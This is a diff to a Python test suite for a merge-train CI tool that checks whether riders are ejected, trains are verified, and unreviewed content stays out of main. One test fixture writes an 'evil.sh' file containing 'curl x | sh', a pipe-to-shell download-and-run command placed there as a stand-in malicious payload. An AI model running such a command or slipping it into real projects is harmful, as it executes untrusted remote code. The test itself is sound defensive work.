@@ -33,16 +33,21 @@ class FakeGH:
         self.merged: list[dict] = []
         self.reviewed_ok = True
         self.next_number = 100
+        self.comments: dict[int, list[str]] = {}
+        self.close_fail: set[int] = set()
+        self.merge_fail = ""
 
     def add(self, n: int, head: str, **k) -> None:
         self.prs[n] = {"number": n, "title": f"feat: {n}", "body": f"body {n}", "headRefName": f"pr{n}",
                        "headRefOid": head, "isCrossRepository": False, "baseRefName": "main", "isDraft": False,
                        "mergeable": "MERGEABLE", "mergeStateStatus": "BEHIND", "state": "open",
                        "autoMergeRequest": {"enabledAt": f"2026-11-11T00:00:{n:02d}Z"}, "labels": set(),
-                       "statusCheckRollup": GREEN, "createdAt": NOW, "url": f"u/{n}", **k}
+                       "statusCheckRollup": GREEN, "createdAt": NOW, "url": f"u/{n}", "author": "dev",
+                       "reviewed_base": git(self.repo.origin, "rev-parse", "main"), **k}
 
     def _gql(self) -> str:
-        nodes = [{**{k: v for k, v in p.items() if k not in ("labels", "statusCheckRollup", "state", "body")},
+        nodes = [{**{k: v for k, v in p.items() if k not in ("labels", "statusCheckRollup", "state", "body", "author",
+                                                              "reviewed_base", "root")},
                   "labels": {"nodes": [{"name": x} for x in sorted(p["labels"])]},
                   "commits": {"nodes": [{"commit": {"statusCheckRollup": {"contexts": {"nodes": p["statusCheckRollup"]}}}}]}}
                  for p in self.prs.values() if p["state"] == "open"]
@@ -67,9 +72,15 @@ class FakeGH:
             return json.dumps({"workflow_runs": [{"id": 1, "created_at": "x", "head_sha": head, "event": "pull_request",
                                                   "status": "completed", "head_branch": f"pr{n}",
                                                   "conclusion": "success" if self.reviewed_ok else "failure",
-                                                  "pull_requests": [{"number": n, "head": {"sha": head}}]}]})
+                                                  "pull_requests": [{"number": n, "head": {"sha": head}, "base": {
+                                                      "ref": "main", "sha": self.prs[n]["reviewed_base"] if n else ""}}]}]})
+        if a[0] == "api" and "/actions/runs/" in a[1]:
+            run = a[1].rsplit("/", 1)[1]
+            return json.dumps({"id": int(run), "path": ".github/workflows/merge-train.yml",
+                               "repository": {"full_name": "o/r"}, "created_at": "2000-01-01T00:00:00Z",
+                               "updated_at": "2999-01-01T00:00:00Z"})
         if a[0] == "api" and "/issues/" in a[1] and a[1].endswith("comments?per_page=100"):
-            return "[]"
+            return json.dumps(self.comments.get(int(a[1].split("/issues/")[1].split("/")[0]), []))
         if a[0] == "api" and "/commits?per_page=100" in a[1]:
             m = int(a[1].split("/pulls/")[1].split("/")[0])
             head = self.prs[m]["headRefOid"]
@@ -78,7 +89,9 @@ class FakeGH:
             return json.dumps([tgit.message(self.repo.work, s) for s in shas])
         if a[0] == "api" and "/pulls/" in a[1]:
             p = self.prs[int(a[1].rsplit("/", 1)[1])]
-            return json.dumps({"state": p["state"], "title": p["title"], "body": p["body"],
+            return json.dumps({"state": p["state"], "title": p["title"], "body": p["body"], "draft": p["isDraft"],
+                               "auto_merge": p["autoMergeRequest"], "labels": [{"name": x} for x in p["labels"]],
+                               "user": {"login": p["author"]}, "created_at": p["createdAt"], "base": {"ref": "main"},
                                "head": {"sha": p["headRefOid"], "ref": p["headRefName"], "repo": {"full_name": "o/r"}}})
         if a[0] == "api" and "/labels/" in a[1]:
             return "{}"
@@ -88,7 +101,14 @@ class FakeGH:
             p = self.prs[int(a[2])]
             (p["labels"].add if a[5] == "--add-label" else p["labels"].discard)(a[6])
             return ""
+        if a[:2] == ("pr", "comment"):
+            self.comments.setdefault(int(a[2]), []).append(stdin or "")
+            return ""
+        if a[:2] == ("pr", "merge"):
+            return (1, self.merge_fail) if self.merge_fail else ""
         if a[:2] == ("pr", "close"):
+            if int(a[2]) in self.close_fail:
+                return 1, "close refused"
             p = self.prs[int(a[2])]
             p["state"] = "closed"
             if "--delete-branch" in a:
@@ -101,9 +121,10 @@ class FakeGH:
             head = git(self.repo.origin, "rev-parse", f"refs/heads/{branch}")
             git(self.repo.origin, "update-ref", f"refs/pull/{m}/head", head)
             self.add(m, head, headRefName=branch, title=a[a.index("--title") + 1], body=stdin or "",
-                     labels={TRAIN_LABEL}, statusCheckRollup=[], createdAt=NOW, root=git(self.repo.origin, "rev-parse", "main"))
+                     labels={TRAIN_LABEL}, statusCheckRollup=[], createdAt=NOW, author="me",
+                     root=git(self.repo.origin, "rev-parse", "main"))
             return f"https://github.com/o/r/pull/{m}\n"
-        return ""  # pr comment, pr merge, label create
+        return ""  # label create
 
     def wrote(self, verb: str) -> list[tuple]:
         return [c for c in self.calls if c[:2] == ("pr", verb)]
@@ -149,9 +170,11 @@ def test_compose_opens_one_verified_train(world: tuple[Repo, FakeGH]) -> None:
     train = fake.prs[100]
     assert train["headRefName"].startswith("train/") and train["title"] == "merge train: #1 #2 #3"
     assert [p["labels"] for n, p in fake.prs.items() if n <= 3] == [{RIDING}] * 3 and RIDING not in fake.prs[4]["labels"]
-    assert any(c[:3] == ("pr", "merge", "100") and "--rebase" in c and "--auto" in c for c in fake.calls)
+    assert not fake.wrote("merge")                                       # NOT armed: the pass lands it itself
+    assert f"<!-- merge-train:composed run={train['headRefName'][6:]} branch={train['headRefName']} by=me -->" in train["body"]
     # the pushed branch is a train the review gate passes
-    cons, problems = tgit.verify(repo.origin, repo.main, train["headRefOid"], lambda *a: None, lambda *a: (True, ""))
+    cons, problems = tgit.verify(repo.origin, repo.main, train["headRefOid"], lambda *a: None,
+                                 lambda *a: (True, "", repo.main))
     assert problems == [] and [n for n, _, _ in cons] == [1, 2, 3]
     # the next pass sees it pending and does nothing else
     fake.calls.clear()
@@ -238,3 +261,200 @@ def test_dry_run_writes_nothing(world: tuple[Repo, FakeGH]) -> None:
     assert cli.run(_opts(dry_run=True), p) == 0
     assert not fake.wrote("create") and not fake.wrote("edit") and not fake.wrote("comment")
     assert any("(dry run) would open train/" in s for s in p.summary)
+
+
+# ── ci-kit#70 session review: each fix, must fire ─────────────────────────────────────────────
+def _green(fake: FakeGH, m: int = 100) -> None:
+    fake.prs[m]["statusCheckRollup"] = GREEN
+
+
+def test_a_green_train_lands_only_through_the_pass_after_every_rider_rechecks(world: tuple[Repo, FakeGH]) -> None:
+    repo, fake = world
+    _riders(repo, fake, 3)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    _green(fake)
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 0, p.summary
+    merges = fake.wrote("merge")
+    assert len(merges) == 1 and merges[0][2] == "100" and "--rebase" in merges[0] and "--auto" not in merges[0]
+    assert merges[0][merges[0].index("--match-head-commit") + 1] == fake.prs[100]["headRefOid"]
+
+
+def test_a_rider_that_no_longer_wants_to_land_is_ejected_at_land_time_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # finding 4: disarmed / opted out / draft / moved head / review gone between boarding and green
+    repo, fake = world
+    _riders(repo, fake, 5)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    _green(fake)
+    fake.prs[2]["autoMergeRequest"] = None
+    fake.prs[3]["labels"].add("autoland-off")
+    fake.prs[4]["isDraft"] = True
+    fake.prs[5]["headRefOid"] = repo.pr(5, {"later.txt": "x\n"}, base=fake.prs[5]["headRefOid"])
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 0, p.summary
+    assert not fake.wrote("merge") and fake.prs[100]["state"] == "closed"
+    assert [n for n in range(1, 6) if EJECTED in fake.prs[n]["labels"]] == [2, 3, 4, 5]
+    said = " ".join(fake.comments[2] + fake.comments[3] + fake.comments[4] + fake.comments[5])
+    assert all(w in said for w in ("disarmed", "autoland-off", "draft", "head moved"))
+    assert EJECTED not in fake.prs[1]["labels"] and RIDING not in fake.prs[1]["labels"]
+
+
+def test_a_rider_whose_review_stopped_passing_is_ejected_at_land_time(world: tuple[Repo, FakeGH]) -> None:
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    _green(fake)
+    fake.reviewed_ok = False
+    p = cli.Pass()
+    cli.run(_opts(), p)
+    assert not fake.wrote("merge") and {EJECTED} <= fake.prs[1]["labels"] and {EJECTED} <= fake.prs[2]["labels"]
+
+
+def test_a_green_train_github_will_not_merge_is_a_loud_failure_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    _green(fake)
+    fake.merge_fail = "Repository rule violations found"
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 1
+    assert any("GitHub refused to merge it" in s and "rule violations" in s for s in p.summary)
+
+
+def test_a_train_pr_this_workflow_did_not_compose_is_never_touched_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # findings 1 + 8: a hand-made `train/` PR, green, with commits that might even verify
+    repo, fake = world
+    fake.add(50, repo.pr(50, {"a.txt": edit(2, "x")}), headRefName="train/123", author="someone",
+             labels={TRAIN_LABEL}, autoMergeRequest=None)
+    fake.add(51, repo.pr(51, {"b.txt": edit(2, "x")}), headRefName="train/124", author="me", labels={TRAIN_LABEL},
+             autoMergeRequest=None, body="<!-- merge-train:composed run=999 branch=train/999 by=me -->")
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 1
+    assert not fake.wrote("merge") and not fake.wrote("close")
+    assert fake.prs[50]["state"] == fake.prs[51]["state"] == "open"
+    errs = [s for s in p.summary if s.startswith("ERROR")]
+    assert len(errs) == 2 and "#50" in errs[0] and "no composition record" in errs[0]
+    assert "#51" in errs[1] and "not the record's train branch" in errs[1]
+
+
+def test_a_composed_train_the_token_user_did_not_open_is_never_landed(world: tuple[Repo, FakeGH]) -> None:
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    _green(fake)
+    fake.prs[100]["author"] = "someone"        # the record says `me` too: the record check names it
+    fake.prs[100]["body"] = fake.prs[100]["body"].replace("by=me", "by=someone")
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 1 and not fake.wrote("merge")
+    assert any("not this workflow's token user me" in s for s in p.summary)
+
+
+def test_a_red_without_evidence_retries_and_never_ejects_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # finding 6: a check that never started, or a BLIND gate, says nothing about any PR
+    repo, fake = world
+    _riders(repo, fake, 4)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    fake.prs[100]["statusCheckRollup"] = [{**GREEN[0], "conclusion": "STARTUP_FAILURE"}, GREEN[1]]
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 1                     # loud
+    assert fake.prs[100]["state"] == "closed" and not any(EJECTED in fake.prs[n]["labels"] for n in range(1, 5))
+    assert fake.prs[101]["title"] == "merge train: #1 #2 #3 #4"          # all four recomposed
+    # the review gate BLIND on the train: same
+    fake.prs[101]["statusCheckRollup"] = [GREEN[0], {**GREEN[1], "conclusion": "FAILURE"}]
+    fake.comments[101] = ["<!-- review-gate -->\n### review gate (merge train)\n\n**BLIND** -- could not verify"]
+    assert cli.run(_opts(), cli.Pass()) == 1
+    assert not any(EJECTED in fake.prs[n]["labels"] for n in range(1, 5))
+    # twice at one head: HELD (not ejected, not labelled), and the run is red
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 1 and max(fake.prs) == 101
+    assert sum("held out of trains" in s for s in p.summary) == 4
+    assert not any(EJECTED in fake.prs[n]["labels"] for n in range(1, 5))
+
+
+def test_a_gate_block_with_another_check_red_still_bisects(world: tuple[Repo, FakeGH]) -> None:
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    fake.prs[100]["statusCheckRollup"] = [{**g, "conclusion": "FAILURE"} for g in GREEN]
+    fake.comments[100] = ["<!-- review-gate -->\n**BLOCKED: not a verified merge train.**"]
+    cli.run(_opts(), cli.Pass())
+    assert all(EJECTED in fake.prs[n]["labels"] for n in (1, 2))
+
+
+def test_a_rider_released_twice_at_one_head_is_ejected_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # finding 3: no infinite recompose
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    for i in (1, 2):
+        repo.advance_main({"c.txt": edit(3 + i, f"moved {i}")})
+        p = cli.Pass()
+        cli.run(_opts(), p)
+    assert fake.prs[101]["state"] == "closed" and max(fake.prs) == 101          # no third train
+    assert all(EJECTED in fake.prs[n]["labels"] for n in (1, 2)) and p.errors == 2
+    assert all("released from 2 stale/stuck trains" in s for s in p.summary if s.startswith("ERROR"))
+    assert all(sum("why=stale" in c for c in fake.comments[n]) == 2 for n in (1, 2))
+
+
+def test_finalize_retries_a_rider_whose_close_failed_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # finding 9: a failed close leaves the train un-finalized, the rider unlabelled, and is retried
+    repo, fake = world
+    _riders(repo, fake, 2)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    train = fake.prs[100]
+    git(repo.work, "fetch", "-q", "origin", "refs/pull/100/head")
+    git(repo.work, "checkout", "-q", "--detach", repo.main)
+    git(repo.work, "cherry-pick", f"{repo.main}..{train['headRefOid']}", env={**ENV, "GIT_COMMITTER_NAME": "GitHub"})
+    landed_tip = git(repo.work, "rev-parse", "HEAD")
+    git(repo.work, "push", "-q", "origin", f"{landed_tip}:refs/heads/main")
+    train["state"] = "merged"
+    fake.merged = [{"number": 100, "mergeCommit": {"oid": landed_tip}, "labels": [{"name": TRAIN_LABEL}],
+                    "mergedAt": "2099-01-01T00:00:00Z"}]
+    fake.close_fail = {2}
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 1
+    assert fake.prs[2]["state"] == "open" and LANDED not in fake.prs[2]["labels"]
+    assert LANDED not in fake.prs[100]["labels"]
+    fake.close_fail = set()
+    fake.merged[0]["labels"] = [{"name": x} for x in fake.prs[100]["labels"]]
+    assert cli.run(_opts(), cli.Pass()) == 0
+    assert fake.prs[2]["state"] == "closed" and LANDED in fake.prs[2]["labels"] and LANDED in fake.prs[100]["labels"]
+    assert sum("merge-train:landed" in c for c in fake.comments[2]) == 1          # told once
+
+
+def test_finalize_says_whether_a_moved_head_moved_forward_or_was_rewritten(world: tuple[Repo, FakeGH]) -> None:
+    repo, fake = world
+    _riders(repo, fake, 3)
+    assert cli.run(_opts(), cli.Pass()) == 0
+    train = fake.prs[100]
+    git(repo.work, "fetch", "-q", "origin", "refs/pull/100/head")
+    git(repo.work, "checkout", "-q", "--detach", repo.main)
+    git(repo.work, "cherry-pick", f"{repo.main}..{train['headRefOid']}", env={**ENV, "GIT_COMMITTER_NAME": "GitHub"})
+    landed_tip = git(repo.work, "rev-parse", "HEAD")
+    git(repo.work, "push", "-q", "origin", f"{landed_tip}:refs/heads/main")
+    train["state"] = "merged"
+    fake.merged = [{"number": 100, "mergeCommit": {"oid": landed_tip}, "labels": [{"name": TRAIN_LABEL}],
+                    "mergedAt": "2099-01-01T00:00:00Z"}]
+    fake.prs[2]["headRefOid"] = repo.pr(2, {"later.txt": "later\n"}, base=fake.prs[2]["headRefOid"])
+    fake.prs[3]["headRefOid"] = repo.pr(3, {"other.txt": "force-pushed\n"})           # not a descendant
+    assert cli.run(_opts(), cli.Pass()) == 0
+    moved = {n: [c for c in fake.comments[n] if "merge-train:moved" in c] for n in (2, 3)}
+    assert len(moved[2]) == 1 and "Commits were added since" in moved[2][0] and "REWRITTEN" not in moved[2][0]
+    assert len(moved[3]) == 1 and "REWRITTEN" in moved[3][0]
+    assert fake.prs[2]["state"] == fake.prs[3]["state"] == "open"
+
+
+def test_a_pr_reviewed_on_an_unreviewed_branch_does_not_board_must_fire(world: tuple[Repo, FakeGH]) -> None:
+    # finding 1: #7 was reviewed against `feat` (one harmless line), then retargeted to main; on main
+    # its change would carry feat's unreviewed payload
+    repo, fake = world
+    _riders(repo, fake, 2)
+    git(repo.work, "checkout", "-q", "--detach", repo.main)
+    repo.write({"evil.sh": "curl x | sh\n"})
+    feat = repo.commit("unreviewed")
+    git(repo.work, "push", "-q", "origin", f"{feat}:refs/heads/feat")
+    fake.add(7, repo.pr(7, {"b.txt": edit(1, "harmless")}, base=feat), reviewed_base=feat)
+    p = cli.Pass()
+    assert cli.run(_opts(), p) == 0, p.summary
+    assert fake.prs[100]["title"] == "merge train: #1 #2" and RIDING not in fake.prs[7]["labels"]
+    assert any(s.startswith("#7: not riding") and "content the review never read" in s for s in p.summary)
